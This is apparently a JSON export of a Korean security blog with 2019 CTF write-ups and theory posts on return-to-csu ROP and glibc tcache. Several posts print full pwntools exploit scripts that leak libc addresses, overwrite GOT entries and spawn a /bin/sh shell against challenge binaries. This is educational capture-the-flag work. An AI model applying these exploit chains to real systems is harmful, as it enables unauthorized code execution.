{"meta":{"title":"j0n9hyun","subtitle":null,"description":"j0n9yhun's repository","author":"j0n9hyun","url":"http://j0n9hyun.github.io","root":"/"},"pages":[],"posts":[{"title":"ALLMN CTF 2019 Doesn't contain K integer","slug":"doesnt_contain_k_integer","date":"2019-05-04T17:06:00.000Z","updated":"2019-05-22T14:02:13.938Z","comments":true,"path":"2019/05/05/doesnt_contain_k_integer/","link":"","permalink":"http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/","excerpt":"","text":"Doesn’t contain K integer 123How many numbers from 1 to N that don&apos;t contain K number. Input: N (integer number) and space K (integer number). Output: The total number. Example if N is 30 and K is 3 there are 27 numbers that don&apos;t contain number 3. So the flag will be ALLMN&#123;total number&#125; [문제 내용] 123456n = 281939942k = 3for i in range(n): if '3' in str(i): n -= 1 print \"total is \" + str(n) [Python] 파이썬으로 짜면 금방인 문제. 하지만 간단하면서도 간단하지 않다. 계산하는 수가 매우 높아서 소요 시간이 개노답이기 때문이다. 그래서 결국 c로 다시 뚝딱했다.[1] c로도 약 2시간 30분이 소요 됐다. (더 빠른 알고리즘이 있겠지만 아몰랑) 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;int main(void)&#123; int num_start = 1; int num_end = 281939942; int num = 0; int digit = 3; int count = 0; digit %= 10; for (num = num_start; num &lt;= num_end; num++) &#123; int temp_num = num; int have = 0; if (num == 0) &#123; if (digit == 0) &#123; have = 1; &#125; &#125; else &#123; while (temp_num &gt; 0) &#123; if (temp_num % 10 == digit) &#123; have = 1; break; &#125; temp_num /= 10; &#125; &#125; if (have == 1) &#123; count++; if (count &gt; 1) &#123; printf(\", \"); &#125; printf(\"%d \", num); &#125; &#125; printf(\"\\n\\ncount : %d\\n\", num_end-count+1); return 0;&#125; [C] [Run] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); } 1.C와 Python의 연산 속도는 약 100배가량 차이가 난다. ↩","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Script","slug":"WriteUps/Script","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Script/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Reutrn-to-Csu Theory","slug":"rtc_theory","date":"2019-04-01T05:00:00.000Z","updated":"2019-05-22T05:51:48.493Z","comments":true,"path":"2019/04/01/rtc_theory/","link":"","permalink":"http://j0n9hyun.github.io/2019/04/01/rtc_theory/","excerpt":"","text":"Return-to-csu Binary File 64bit ROP 기법을 사용할 때 우리는 gadget을 이용하곤 한다. 하지만 우리가 원하는 pop gadget이 존재하지 않을 경우는 어떻게 할까? 바로 RTC 를 사용하여 우회를 시킬 수 있다. 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-40h] setvbuf(stdin, 0LL, 2, 0LL); write(1, \"Hey, ROP! What's Up?\\n\", 0x15uLL); return read(0, &amp;buf, 0x200uLL);&#125; [Problem] 확인하기 위해 본인 사이트에 올라가 있는 문제를 예시로 들겠다. 문제에는 일반적인 ROP처럼 write 함수와 read 함수가 주어져있다. 123456789101112[INFO] File: rtc0x00000000004006bc: pop r12; pop r13; pop r14; pop r15; ret; 0x00000000004006be: pop r13; pop r14; pop r15; ret; 0x00000000004006c0: pop r14; pop r15; ret; 0x00000000004006c2: pop r15; ret; 0x000000000040054f: pop rbp; mov edi, 0x601048; jmp rax; 0x00000000004006bb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 0x00000000004006bf: pop rbp; pop r14; pop r15; ret; 0x0000000000400560: pop rbp; ret; 0x00000000004006c3: pop rdi; ret; 0x00000000004006c1: pop rsi; pop r15; ret; 0x00000000004006bd: pop rsp; pop r13; pop r14; pop r15; ret; [gadgets] gadget 도구를 이용해서 확인해보면 rdi와 rsi를 채울 수 있을만한 gadget이 보이지 않는다. 그래도 괜찮다 우리에겐 csu가 있으니까! _libc_csu_init 이라는 함수를 어셈블리 뷰로 확인해보자. 123456789101112131415161718192021.text:0000000000400660 ; void _libc_csu_init(void).text:0000000000400660 public __libc_csu_init.text:0000000000400660 __libc_csu_init proc near.text:0000000000400660 ; __unwind &#123;.text:0000000000400660 push r15.text:0000000000400662 push r14.text:0000000000400664 mov r15d, edi.text:0000000000400667 push r13.text:0000000000400669 push r12.text:000000000040066B lea r12, __frame_dummy_init_array_entry.text:0000000000400672 push rbp.text:0000000000400673 lea rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040067A push rbx.text:000000000040067B mov r14, rsi.text:000000000040067E mov r13, rdx.text:0000000000400681 sub rbp, r12.text:0000000000400684 sub rsp, 8.text:0000000000400688 sar rbp, 3.text:000000000040068C call _init_proc.text:0000000000400691 test rbp, rbp.text:0000000000400694 jz short loc_4006B6 [libc_csu_init] 1234567891011.text:00000000004006B6 loc_4006B6:.text:00000000004006B6 add rsp, 8.text:00000000004006BA pop rbx.text:00000000004006BB pop rbp.text:00000000004006BC pop r12.text:00000000004006BE pop r13.text:00000000004006C0 pop r14.text:00000000004006C2 pop r15.text:00000000004006C4 retn.text:00000000004006C4 ; &#125; // starts at 400660.text:00000000004006C4 __libc_csu_ini [libc_csu_init gadget1] 여기서 우리가 조작할 수 있는 주소는 rbx, rbp, r12, r13, r14, r15 이다. 첫번째, 두번째 인자값을 받는 rdi, rsi가 없는데 어떻게 할 수 있을까란 생각이 들 수 있겠지만 그 부분은 바로 아래의 코드를 확인하면 알 수 있을 것이다. 12345678.text:00000000004006A0 loc_4006A0:.text:00000000004006A0 mov rdx, r13.text:00000000004006A3 mov rsi, r14.text:00000000004006A6 mov edi, r15d.text:00000000004006A9 call qword ptr [r12+rbx*8].text:00000000004006AD add rbx, 1.text:00000000004006B1 cmp rbx, rbp.text:00000000004006B4 jnz short loc_4006A0 [libc_csu_init gadget2] [gadget1] 코드에서 pop 해줬던 r15,r14,r13 값을 다시 edi,rsi,rdx에 셋팅한다.(보다시피 rdi가 아닌 edi라서 edi 값은 32비트 범위의 한해서만 조작이 가능하다.) 그리고는 r12+rbx*8한 값을 호출하는데 rbx 값을 0으로 셋팅해준다면 0[rbx] * 8이 돼서 최종적으로 r12의 값만 호출할 수 있게끔 한다. rbx의 값에 1을 더하고 rbp값과 비교연산을 거친다. rbx값을 1로 셋팅해준다면 조건분기문도 성립되어 문제 없이 통과하게 된다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"0CTF CTF 2019 aegis (Incompletion)","slug":"0ctf_aegis","date":"2019-03-26T01:45:00.000Z","updated":"2019-05-22T14:02:25.064Z","comments":true,"path":"2019/03/26/0ctf_aegis/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/","excerpt":"","text":"aegis Binary File [Mitigation] 잘 안 보이는 보호기법이 추가되었다. (대회에서 나온 거 처음 봄) [In IDA] IDA를 통해서 열어보면 ASAN, UBSAN 보호기법의 영향으로 마치 libc 파일을 여는 듯이 불러오는 함수가 많다. (보기 싫어진다) [main.c] 여느 힙 문제와 같이 메뉴들이 주어졌는데 하단에 보면 히든 메뉴가 있다. [굉장히 보기 싫게 생긴 코드] [delete menu] 이 부분에서 UAF가 발생한다. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131from pwn import *p = process('./aegis')def add_note(size, content, ID): p.sendlineafter(\"Choice: \", \"1\") p.sendlineafter(\"Size: \", str(size)) p.sendafter(\"Content: \", str(content)) p.sendlineafter(\"ID: \", str(ID))def show_note(index): p.sendlineafter(\"Choice: \", \"2\") p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"Content: \", str(p.recvline)) return p.recvline()def update_note_sendline(index, new_content, new_ID): p.sendlineafter(\"Choice: \", \"3\") p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))def update_note(index, new_content, new_ID): p.sendlineafter(\"Choice: \", \"3\") p.sendlineafter(\"Index: \", str(index)) p.sendafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))def delete_note(index): p.sendlineafter(\"Choice: \", \"4\") p.sendlineafter(\"Index: \", str(index))def secret(addr): p.sendlineafter(\"Choice: \", \"666\") p.sendlineafter(\"Lucky Number: \", str(addr))def exit(): p.sendlineafter(\"Choice: \", \"5\")def to_asan(addr): return ((addr &gt;&gt; 3) + 0x7fff8000)def leak_word(): note_data = show_note(0) print \"note data\", note_data note_data = note_data.split('\\n')[0] note_data = (u64(note_data.ljust(8, '\\x00'))) return note_dataVAL = 0xffffffffffffffffadd_note(16, \"a\"*8, VAL)add_note(16, \"b\"*8, VAL)addr = to_asan(0x602000000020)print \"magiccc\", hex(addr)secret(addr)# do 1st updateupdate_note(0, 'C'*18, 0xffff)# do 2nd updatepayload = 'd'*16 + '\\x02'*3payloadid = 0xffffffff02ffffffupdate_note_sendline(0, payload, payloadid)delete_note(0)add_note(16, p64(0x602000000018), 0x00)note_data = leak_word()cfi = note_datatext_base = note_data - 1133232log.progress(\"Text base: &#123;&#125;\".format((hex(text_base))))got_offset = 0x000000000347E28def arb_read(addr): update_note(2, \"c\"*(1)+\"\\n\", VAL) update_note(2, \"c\"*(2), 0xffff) update_note(2, \"c\"*(4), 0xffff) update_note(2, \"c\"*(6), 0xffff) update_note(2, \"c\"*(8), 0xffff) update_note(2, p64(addr)[0:7] + \"\\n\", cfi) note_data = leak_word() return note_datalibc = arb_read(got_offset + text_base)libc -= 526784log.progress(\"LIBC: &#123;&#125;\".format(hex(libc)))one_gadget = libc + 0x10a38c+12log.progress(\"ONE GADGET: &#123;&#125;\".format(hex(one_gadget)))malloc_hook_offset = 0x00000000003ebc30main_arena_offset = 4111424asan_malloc_hook_offset = 0x7ae140san_userdie_callback = 0xFB0888strtoul_got_offset = 0x347f20environ_offset = 4120728# intercepted methodsreal_vprintf_off = 0x55BBB0real_memset_off = 0x55Bd30real_cxa_atexit = 0x559208update_func = text_base + 0x114614main_func = text_base + 0x114990# perform overwrite!overwrite_addr = text_base + san_userdie_callback + 0x18 pop_rdx_rcx_rbx_ret = 0x0000000000103cc9 ret = 0x0000000000b17c5def arb_write(addr, val, idval = 0, use_cfi = True): update_note(2, \"c\"*(1)+\"\\n\", VAL) update_note(2, \"c\"*(2), 0xffff) update_note(2, \"c\"*(4), 0xffff) update_note(2, \"c\"*(6), 0xffff) update_note(2, \"c\"*(8), 0xffff) mycfi = cfi if use_cfi else 0 update_note(2, p64(addr)[0:6] + \"\\n\", one_gadget &lt;&lt; 8) print \"idval\", hex(idval) update_note(0, p64(val)[0:6] + \"\\n\", 0)def update_trunc(index, new_content, new_ID): p.sendlineafter(\"Index: \", str(index)) p.sendlineafter(\"New Content: \", str(new_content)) p.sendlineafter(\"New ID: \", str(new_ID))rop_gadget = libc + 0x9df05arb_write(overwrite_addr, rop_gadget, idval=libc + ret, use_cfi = False)p.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 EZ","slug":"EZ","date":"2019-03-25T07:27:00.000Z","updated":"2019-05-22T14:03:58.153Z","comments":true,"path":"2019/03/25/EZ/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/EZ/","excerpt":"","text":"EZ File [Problem] [Steganography Decoding] [Hidden.txt] [Googling] [SHA-1 Encoding] flag is Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174} img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 HIDDEN","slug":"securinets_hidden","date":"2019-03-25T06:41:00.000Z","updated":"2019-05-22T14:04:03.774Z","comments":true,"path":"2019/03/25/securinets_hidden/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinets_hidden/","excerpt":"","text":"HIDDEN [Problem] [Web Page] [Get FLAG] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Misc","slug":"WriteUps/Misc","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Misc/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Easy Trade","slug":"securinet_easy_trade","date":"2019-03-25T06:25:00.000Z","updated":"2019-05-22T14:04:09.174Z","comments":true,"path":"2019/03/25/securinet_easy_trade/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/","excerpt":"","text":"Easy Trade Pcap File [Problem] [Pcap File 1-1] [Pacp File 1-2] [4444 Port Packet] [Hxd] [flag.zip] [Zip Password] [Base64 Decoding] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Foren","slug":"WriteUps/Foren","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Foren/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Baby One","slug":"securinet_baby1","date":"2019-03-25T05:22:00.000Z","updated":"2019-05-22T14:04:16.843Z","comments":true,"path":"2019/03/25/securinet_baby1/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinet_baby1/","excerpt":"","text":"Baby One Binary File [Problem] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051r = process('./baby1')#r = remote('51.254.114.246', 1111)e = ELF('./baby1', checksec=False)libc = e.libcpr = 0x4006c3csu_init1 = 0x4006B6csu_init2 = 0x4006A0main_addr = e.symbols['main']write_got = e.got['write']write_os = libc.symbols['write']read_got = e.got['read']system_os = libc.symbols['system']binsh_os = libc.search('/bin/sh').next()libc_start = e.got['__libc_start_main']payload = \"\"payload += 'A'*56payload += p64(csu_init1)payload += \"A\"*8payload += p64(0)payload += p64(1)payload += p64(write_got)payload += p64(8)payload += p64(write_got)payload += p64(1)payload += p64(csu_init2)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(0)payload += p64(main_addr)r.recvline()r.sendline(payload)leaked = u64(r.recv(6).ljust(8, '\\x00'))libc_base = leaked - write_ossystem_addr = libc_base + system_osbinsh_addr = libc_base + binsh_ospayload = \"\"payload += 'A'*56payload += p64(pr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendlineafter(\"\\n\", payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Securinets Prequals CTF 2019 Welcome","slug":"securinets_welcome","date":"2019-03-25T05:20:00.000Z","updated":"2019-05-22T14:04:26.292Z","comments":true,"path":"2019/03/25/securinets_welcome/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/25/securinets_welcome/","excerpt":"","text":"Welcome [Problem] [wrapper.c] [Get FLAG] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"Tcache Theory Analysis","slug":"tcache_theory","date":"2019-03-19T01:21:00.000Z","updated":"2019-05-22T07:49:40.692Z","comments":true,"path":"2019/03/19/tcache_theory/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/19/tcache_theory/","excerpt":"","text":"Tcache 12345678910111213141516171819202122#if USE_TCACHE/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence \"tcache_perthread_struct\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct;static __thread char tcache_shutting_down = 0;static __thread tcache_perthread_struct *tcache = NULL; [tcache_entry] Ubuntu 17.04 에서 glibc 2.6 버전이 릴리즈 되었는데 tcache_entry와 tcache_perthread_struct라는 구조체가 새로 추가되었다. 특징 Single linked list(단일 연결 구조)를 이루고 있다. Consolidate를 하지 않는다. LIFO 구조를 가지고 있다. Pointer가 오직 next chunk만 포함하고 있다. 기본적으로 Chunk Size는 24 ~ 1032 bytes 이다. (32bit : 12 ~ 516 bytes) 123/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7 tcache bin 한 개당 기본적으로 7개의 Chunk를 가질 수 있다. 123#if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64 12345678910111213tcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125; [tcache_put] 12345678910111213/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;counts[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; return (void *) e;&#125; [tcache_get] tcache_put과 tcache_get 함수는 _int_free 와 __libc_malloc 함수가 시작할때 호출된다. tacace_get은 할당된 크기의 영역이 요청될때 0x408보다 작으면 호출된다. [free] [한번 더 free] entry와 count가 보이는 것을 알 수 있다. img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"Warm Heap","slug":"warm_heap","date":"2019-03-05T02:22:00.000Z","updated":"2019-05-22T05:59:41.342Z","comments":true,"path":"2019/03/05/warm_heap/","link":"","permalink":"http://j0n9hyun.github.io/2019/03/05/warm_heap/","excerpt":"","text":"Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; void *v3; // ST10_8 void *v4; // ST18_8 char s; // [rsp+20h] [rbp-1010h] unsigned __int64 v6; // [rsp+1028h] [rbp-8h] v6 = __readfsqword(0x28u); v3 = malloc(16uLL); *(_DWORD *)v3 = 1; *((_QWORD *)v3 + 1) = malloc(8uLL); v4 = malloc(16uLL); *(_DWORD *)v4 = 2; *((_QWORD *)v4 + 1) = malloc(8uLL); fgets(&amp;s, 4096, stdin); strcpy(*((char **)v3 + 1), &amp;s); fgets(&amp;s, 4096, stdin); strcpy(*((char **)v4 + 1), &amp;s); exit(0);&#125; [메인 함수] [동작 과정] 12345678910from pwn import *r = process('./warm_heap.bin')elf = ELF('./warm_heap.bin')flag = 0x400826exit_got = 0x601068dpayload = \"A\"*40 + p64(elf.got['exit']) + \"\\n\" + p64(flag)r.sendline(payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"}]},{"title":"CODEGATE 2018 betting","slug":"betting","date":"2019-02-19T13:30:00.000Z","updated":"2019-05-22T14:04:49.875Z","comments":true,"path":"2019/02/19/betting/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/19/betting/","excerpt":"","text":"betting Binary File [사진 1-1] Canary가 걸려있으므로 Canary Leak을 해줘야 한다 우선 프로그램을 실행해보자. [사진 1-2] [사진 1-3] 함수를 하나하나 훑어보면 shell 실행 함수가 떡하니 나와있다. 앞에 padding을 하고 마지막에 오는 ret 주소 부분에 이 helper 함수를 넣어주면 될 것이다. 12345678910111213141516171819202122232425from pwn import *r = process('./betting')helper = 0x4008F6def canary(): global canary r.sendlineafter(\"? \", \"A\"*24) r.sendlineafter(\"? \", \"2\") r.recvuntil(\"A\"*24 + \"\\n\") canary = u64(\"\\x00\" + r.recv()[:7]) r.sendlineafter(\"? \", \"2\")def exploit(): payload = \"\" payload += \"A\"*40 payload += p64(canary) payload += \"A\"*8 payload += p64(helper) r.sendline(payload) r.interactive()if __name__ == \"__main__\": canary() exploit() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"},{"name":"CTF","slug":"CTF","permalink":"http://j0n9hyun.github.io/tags/CTF/"}]},{"title":"DEFCON 2015 r0pbaby","slug":"r0pbaby","date":"2019-02-18T10:07:00.000Z","updated":"2019-05-22T06:01:38.413Z","comments":true,"path":"2019/02/18/r0pbaby/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/18/r0pbaby/","excerpt":"","text":"r0pbaby Binary File [바이너리 보호기법 확인] [실행 화면 메뉴] 1번 진입시, libc의 주소를 알려준다. 하지만 확인해보니 실제 libc 주소는 아니었다. 2번 진입시, symbol 입력란이 추가로 뜨는데 여기서 system 함수의 주소를 알려준다. 3번 진입시, 최대 1024 바이트까지 버퍼를 보낼 수 있다. 우리가 최종적으로 페이로드를 보내는 곳이다. [system 함수 주소] libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. PIE가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다. 3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공! 123456789101112131415161718192021222324252627from pwn import *r = process('./r0pbaby')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')binsh_offset = libc.search('/bin/sh').next()system_offset = libc.symbols['system']pr = 0x21102 # pop rdi; retr.sendlineafter(\": \", \"2\")r.sendlineafter(\": \", \"system\")r.recvuntil(\"0x\")system_addr = int(r.recv(16), 16)libc_base = system_addr - system_offsetpr_addr = libc_base + prbinsh_addr = libc_base + binsh_offsetr.sendlineafter(\": \", \"3\")r.sendline(\"32\")payload = \"A\"*8payload += p64(pr_addr)payload += p64(binsh_addr)payload += p64(system_addr)r.sendline(payload)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/categories/WriteUps/"},{"name":"Pwn","slug":"WriteUps/Pwn","permalink":"http://j0n9hyun.github.io/categories/WriteUps/Pwn/"}],"tags":[{"name":"WriteUps","slug":"WriteUps","permalink":"http://j0n9hyun.github.io/tags/WriteUps/"}]},{"title":"TRUST CTF 2019 start","slug":"pwnstart","date":"2019-02-15T05:40:00.000Z","updated":"2019-05-22T13:48:54.210Z","comments":true,"path":"2019/02/15/pwnstart/","link":"","permalink":"http://j0n9hyun.github.io/2019/02/15/pwnstart/","excerpt":"","text":"start Binary File 123456789sub_4005E6 proc near; __unwind &#123;push rbpmov rbp, rsppop raxpop rdxpop rdipop rsiretn [sub_4005E6] 4개의 sub 함수 중 4005E6에는 pop gadget이 있다. 123456789__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char buf; // [rsp+0h] [rbp-10h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); read(0, &amp;buf, 0x78uLL); return 0LL;&#125; [main] 바이너리 파일을 뜯어보면 sub로 시작하는 함수 4개와 메인함수가 있다. 언뜻봐도 알 수 있듯이 read 함수에서 BOF 취약점이 터지는 것을 확인할 수 있다. 보통은 write 같은 함수가 주어져야 하는데 read 함수밖에 없는 걸로 보아 일반적으로 하는 ROP 기법은 사용할 수 없다. 그래서 같이 주어져 있는 libc 파일에서 syscall 가젯을 사용한다. 주소값의 하위 3비트는 고정적인 값을 지니고 있기 때문에 read의 libc 주소 1 바이트를 syscall의 하위 1 바이트 주소로 바꿔서 보내면 된다. 123456789101112131415161718192021222324252627282930from pwn import *#r = remote('server.trustctf.com', 10392)r = process('./start')e = ELF('./start')pr = 0x4005ed # pop rsippppr = 0x4005ea # pop rax,rdx,rdi,rsicmd = \"/bin/sh\\x00\"syscall = \"\\x7b\"payload = \"\"payload += \"A\"*24payload += p64(pr)payload += p64(e.bss())payload += p64(e.plt['read'])payload += p64(pr)payload += p64(e.got['read'])payload += p64(e.plt['read'])payload += p64(ppppr)payload += p64(59)payload += p64(0)payload += p64(e.bss())payload += p64(0)payload += p64(e.plt['read'])payload += cmdr.sendline(payload)r.send(syscall)r.interactive() [Exploit Code] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); 